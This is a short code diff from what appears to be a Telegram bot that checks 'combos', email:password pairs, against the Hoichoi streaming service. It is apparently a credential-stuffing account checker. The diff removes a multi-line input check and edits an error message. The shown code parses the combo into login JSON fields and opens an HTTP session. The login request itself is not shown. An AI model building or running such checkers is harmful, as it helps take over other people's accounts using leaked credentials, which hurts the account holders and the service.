@@ -11,18 +11,12 @@ head = {
 }
 def hoichoi_helper(chat_id, combo):
     status = Sendmessage(chat_id, '<i>Checking...</i>')
-    if '\n' in combo:
-        try:
-            combo.split('\n')
-            logger.info('More than 1')
-        except Exception as e:
-            logger.info(e)
     try:
         combo_split = combo.split(':')
         inpumail = combo_split[0]
         inpupass = combo_split[1]
     except IndexError:
-        return Editmessage(chat_id, 'Enter Valid Combo', status)
+        return Editmessage(chat_id, 'Enter Valid Combo😡😡', status)
     email= f'"email":"{inpumail}"'
     password = f'"password":"{inpupass}"'
     session_request = requests.Session()
